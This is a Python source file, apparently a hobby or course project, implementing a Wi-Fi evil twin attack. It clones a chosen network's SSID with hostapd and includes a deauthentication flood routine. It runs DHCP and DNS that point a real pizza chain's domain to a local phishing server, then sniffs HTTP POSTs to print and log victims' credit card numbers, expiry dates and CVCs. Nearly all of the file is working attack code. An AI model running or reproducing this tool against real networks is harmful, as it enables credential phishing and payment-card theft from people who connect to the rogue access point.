import json
import os
import sys
import time
from _thread import start_new_thread

import netifaces as NetworkInterfaces
from prettytable import PrettyTable
from scapy.layers.dhcp import DHCP
from scapy.layers.dot11 import Dot11Beacon, Dot11, RadioTap, Dot11Deauth
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import sniff, sendp

wifiNetworks = {}

# This project uses the following unix software:
"""
1. Hostapd (Host access point daemon) is capable of turning normal network interface cards into access points and authentication servers.
2. Dnsmasq provides network infrastructure and services for small networks: DNS, DHCP and network boot.
3. iptables is a linux firewall program. iptables will monitor inbound and outbound traffic as well as forward traffic.
"""


def DeauthAttack(gateway_mac, adapterName):
    # addr1: destination MAC (Everyone in the wifi network)
    # addr2: source MAC- (who is requesting the deauthentication - in an attack we can just choose the AP itself)
    # addr3: Access Point MAC (the target of our deauth attack)
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=gateway_mac, addr3=gateway_mac)
    # Radio tap: layer that contains additional information about transmissions like channel...
    # dot11- IEE802.11 (the packet that we created for the deauth attack)
    # Dot11Deauth - contains reason field
    packet = RadioTap() / dot11 / Dot11Deauth(
        reason=1)  # unspecified reason =1 , ! need to figure out what the operator / does
    # send the packet
    while True:
        # inter- the time to wait between 2 packets
        sendp(packet, inter=0.1, count=None, iface=adapterName, verbose=0)  # do not show "Sent 1 Packet..."


def EvilTwinAP(networkToHack, adapterName):

    configurationFile = "/hostapd.conf"  # Name of saved file on HDD (project directory)

    fileContent = 'interface=%s\n' \
                  'driver=nl80211\n' \
                  'ssid=%s\n' \
                  'hw_mode=g\n' \
                  'channel=1' % (adapterName, networkToHack)

    # Interface= What monitor modded interface we will use for the Evil Twin AP.
    # Driver = Wireless driver nl80211 - iee802.11
    # SSID = Name of the Wifi access point
    # hw_mode= 802.11 g wireless.
    # channel = what channel to broadcast the AP.

    f = open("/hostapd.conf", 'w')
    f.write(fileContent)
    f.close()

    # Run hostpad with no terminal output (to minimize clutter)
    os.system("sudo hostapd %s >/dev/null 2>&1" % configurationFile)  # and this


def iptablesPassthru():
    # This function forwards traffic from the Wifi adapter to the ethernet adapter
    '''
    NAT Table = This table is consulted when a packet that creates a new connection is encountered
    POSTROUTING = for altering packets as they are about to go out.
    out-interface = Name of an interface via which a packet is going to be sent
    MASQUERADE = Masquerading is equivalent to specifying a mapping to the IP address of the interface the packet is going out.
    append - Append a chain of rules.
    -j = jump
    '''
    # The following iptable command is forwarding the postrouting (after routing the ip)  to enp1s0
    os.system('iptables --table nat --append POSTROUTING --out-interface enp1s0 -j MASQUERADE')
    # This command tells iptables to accept (forward) all traffic from the wifi adapter.
    os.system('iptables --append FORWARD --in-interface wlxc83a35c2e0b8 -j ACCEPT')
    # Command which enables packets forwarding (since we want to listen to incoming connections)
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def scanWifi(pkt):
    if pkt.haslayer(Dot11Beacon):  # Check if the packet has an Wireless information
        if pkt.type == 0 and pkt.subtype == 8:
            # Subtype 8 is a beacon frame is one of the management frames (type=0) in IEEE 802.11 based WLANs.
            # It contains all the information about the network. Beacon frames are transmitted periodically,
            # they serve to announce the presence of a wireless LAN and to synchronise the members of the service set.
            # Beacon frames are transmitted by the access point (AP)
            if not (pkt.info.decode("utf-8") in wifiNetworks):  # Check to see if the network is not already in the Dictionary
                wifiNetworks[pkt.info.decode("utf-8")] = (pkt.addr3, 1)  # (pkt.addr3, 1) is needed because this is how the scanning works (otherwise no MAC)
        else:
            pass
    else:
        pass


def scanForWLAN(adapterName):
    print('Sniffing for Wireless Networks...')
    sniff(prn=scanWifi, iface=adapterName, count=500)  # lunches scanWifi with specified timeout

    # Create a pretty table
    table = PrettyTable(['Network Index', 'Network Name', 'MAC ADDRESS'])
    i = 1
    for ssid, mac_beacons in wifiNetworks.items():
        table.add_row([i, ssid, str(mac_beacons[0])])
        i = i + 1
    print(table)


def PrintDeviceIP(packet):
    # packet[DHCP].options[0][1] == 5 means that the server is acknowledging the DHCP offer
    # and is providing an IP Address
    # Basically Print The Connected device IP that was given by DHCP
    if DHCP in packet and packet[DHCP].options[0][1] == 5:
        print(f"{packet[IP].dst} is Connected!")


def DetectNewDevices(adapterName):
    while True:
        # This sniffer sniffs port 67,68 to detect server and client DHCP messages.
        sniff(filter="udp and (port 67 or 68)", prn=PrintDeviceIP, iface=adapterName)


def dhcpStarter(adapterName):  # Lets construct a dnsmasq conf file
    nameOfDir = "fakeap"
    nameConfFile = "%s/dnsmasq.conf" % (nameOfDir)
    ipRangeWithTTL = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
    apIP = '192.168.1.1'
    dnsIP = apIP
    listenAddr = '127.0.0.1'
    netmask = '255.255.255.0'
    apacheIP = '10.0.0.18'
    text = 'port=0\ninterface=%s\ndhcp-range=%s\ndhcp-option=3,%s\n' \
           'dhcp-option=6,%s\nserver=8.8.8.8\nlisten-address=%s\n' \
           'listen-address=192.168.1.1\naddn-hosts=dnsmasq.hosts' \
           % (adapterName, ipRangeWithTTL, apIP, dnsIP, listenAddr)
    # Write the Ddnsmasq config file
    f = open(nameConfFile, mode='w')
    f.write(text)
    f.close()
    # write the host of the apache server
    CreateHostsDNSmasq(apacheIP, 'www.dominospizza.co.il')

    # Set the IP of the monitoring interface to the GW and to the corresponding subnet
    os.system('ifconfig %s up %s netmask %s' % (adapterName, apIP, netmask))
    # Add routing table for the all the 192.168.1.0/24 subnet with silent routing
    os.system('route add -net 192.168.1.0 netmask %s gw %s' % (netmask, apIP))
    # Start dnsmasq after all configurations
    os.system('dnsmasq -C %s -d' % nameConfFile)




def CreateHostsDNSmasq(apacheIP, url):
    nameOfHostsFile = 'dnsmasq.hosts'
    text = apacheIP + ' ' + url

    fi = open('dnsmasq.hosts', 'w')
    fi.write(text)
    fi.close()


def dataSniffer(adapterName):
    # show all port 80 HTTP connections (as an extra)
    print('Listening For Network activity...')
    while True:
        sniff(filter="tcp port 80", prn=PhishData, iface=adapterName, store=False)


def PhishData(packet):  # Change only JSON related stuff

    webSiteName = '10.0.0.18'  # nameOfSite is a filter to process only http requests involving webSiteName string
    if packet.haslayer(HTTPRequest):  # If this packet is an HTTP Request

        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()  # get the requested URL to string
        print("\nDomain visited at port 80: " + "\n" + url + "\n")
        HTTPrequest = packet[HTTPRequest].Method.decode()
        path = packet[HTTPRequest].Path.decode()
        if webSiteName in url and HTTPrequest == 'POST' and packet.haslayer(Raw):
            creditDetails = str(packet[Raw].load)
            if creditDetails.find('credit'):
                # if data contains 'credit'
                # then show data
                creditData = json.loads(packet[Raw].load.decode('utf-8'))
                print(
                    f"\n"
                    f"Inbound Credit card details:\n\n"
                    f"Credit Card Number: {creditData['credit']}\n"
                    f"Expiration Date: {creditData['date']}\n"
                    f"CVC: {creditData['three_num']}")

                f = open('credits.log', 'w')
                f.write(packet[Raw].load.decode('utf-8') + '\n', 'a')
                f.close()

        # Http GET for get the site
        elif webSiteName in url and HTTPrequest == 'GET' and path == '/':
            print(f"[!] {packet[IP].src} is at phishing website!")


def main():
    adapterName = sys.argv[1]

    print('Changing %s to Monitoring Mode' % adapterName)
    # First we need to enter into Monitor mode for the given adapter (0.5 of waiting was added to make sure it is not too fast)
    os.system('sudo ifconfig %s down' % adapterName)  # turn off the adapter (software)
    time.sleep(0.5)
    os.system('sudo iwconfig %s mode monitor' % adapterName)  # set into monitoring mode
    time.sleep(0.5)
    os.system('sudo ifconfig %s up' % adapterName)  # turn on the adapter (software)
    time.sleep(0.5)

    scanForWLAN(adapterName)

    targetWifiIndex = ""
    while not (targetWifiIndex in wifiNetworks):
        targetWifiIndex = input("Select a network run EvilTwin On: \t")
    networkToHack = targetWifiIndex

    #print('Disconnecting All clients at: %s' % networkToHack)
    #start_new_thread(DeauthAttack, (wifiNetworks[targetWifiIndex][0], adapterName,))

    print('Starting Duplicate EvilTwin Network similar to: %s' % networkToHack)
    start_new_thread(EvilTwinAP, (networkToHack, adapterName,))

    print('Creating iptables passthru')
    start_new_thread(iptablesPassthru, ())

    print('Starting DNS and DHCP Services for the Evil Twin AP')
    start_new_thread(dhcpStarter, (adapterName,))

    time.sleep(10)

    print('Ready To Provide DHCP Services')
    start_new_thread(DetectNewDevices, (adapterName,))

    dataSniffer(adapterName)


if __name__ == '__main__':
    main()
